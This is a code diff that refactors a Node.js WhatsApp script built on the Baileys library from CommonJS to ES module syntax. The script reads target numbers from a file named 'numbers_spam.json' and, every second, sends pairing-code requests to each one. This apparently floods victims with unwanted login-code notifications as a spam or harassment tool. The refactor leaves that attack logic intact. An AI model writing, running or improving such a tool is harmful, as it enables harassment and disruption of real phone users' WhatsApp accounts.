@@ -1,37 +1,37 @@
-const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
-const pino = require('pino');
-const readline = require("readline");
-const axios = require('axios');
-const path = require('path');
-const fs = require('fs').promises;
-const { fork } = require('child_process');
+import makeWASocket, { useMultiFileAuthState } from "@whiskeysockets/baileys";
+import pino from 'pino';
+import readline from "readline";
+import fs from 'fs/promises';
+import { fork } from 'child_process';
+import path from 'path';
 
 const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
 
 const question = (text) => new Promise((resolve) => rl.question(text, resolve));
 
-async function fetchPhoneNumbers() {
+const fetchPhoneNumbers = async () => {
     try {
         const data = await fs.readFile('numbers_spam.json', 'utf8');
-        const jsonData = JSON.parse(data);;
+        const jsonData = JSON.parse(data);
         return Object.values(jsonData).flat();
     } catch (error) {
         return [];
     }
-}
+};
 
-async function processRequests(XeonBotInc, phoneNumbers, xeonCodes) {
+const processRequests = async (XeonBotInc, phoneNumbers, xeonCodes) => {
     const promises = phoneNumbers.slice(0, xeonCodes).map(async (number) => {
         try {
             await XeonBotInc.requestPairingCode(number);
         } catch (error) {
+            // Handle error if needed
         }
     });
 
     await Promise.all(promises);
-}
+};
 
-async function XeonProject() {
+const XeonProject = async () => {
     const { state } = await useMultiFileAuthState('./session_sp');
     const XeonBotInc = makeWASocket({
         logger: pino({ level: "silent" }),
@@ -78,6 +78,7 @@ async function XeonProject() {
                 phoneNumbers = await fetchPhoneNumbers();
                 await processRequests(XeonBotInc, phoneNumbers, xeonCodes);
             } catch (error) {
+                // Handle error if needed
             }
         }, 1000);
 
@@ -87,12 +88,13 @@ async function XeonProject() {
         }, 900000);
 
     } catch (error) {
+        // Handle error if needed
     } finally {
         rl.close();
     }
 
     return XeonBotInc;
-}
+};
 
 XeonProject().then(() => {
     const scriptPath = path.resolve(__filename);
